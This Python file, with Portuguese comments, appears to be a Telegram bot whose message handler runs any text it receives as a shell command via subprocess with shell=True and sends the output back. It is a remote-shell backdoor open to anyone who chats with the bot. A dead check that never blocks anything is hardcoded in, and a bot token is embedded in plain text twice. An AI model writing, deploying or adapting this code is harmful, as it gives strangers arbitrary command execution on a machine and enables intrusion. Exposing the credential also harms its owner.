import logging, subprocess, os
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters


# Seu TOKEN aqui
token = "658846022:AAFgLv26LGx1_AV4bDClvfz1kQnWJ5Lwwc4"


def start(bot, update):
    """Mensagem de boas vindas /start."""
    update.message.reply_text("[ Seus DADOS ]\nNome: {} \nUsername: {} \nID: {} \n\n[ BOT ]\n[+] Voce tem acesso a uma Shell\n[!] Envie um Comando respondendo a mensagem !".format(update.message.from_user.first_name, update.message.from_user.username, update.message.from_user.id))


def fk(bot, update):
    msg = update.message.text
    passa = 2;
    if passa == 1:
        update.message.reply_text("Impossivel usar o comando: {}".format(msg))
    else:
        saida = subprocess.check_output(update.message.text, shell=True)
        update.message.reply_text(saida)

def main():
    """Inicia o bot."""
    updater = Updater("658846022:AAFgLv26LGx1_AV4bDClvfz1kQnWJ5Lwwc4")
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text, fk))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()


'''
############################################
############################################
############################################
#######Developed by S4m JR | ShdowCat#######
############################################
############################################
############################################
'''
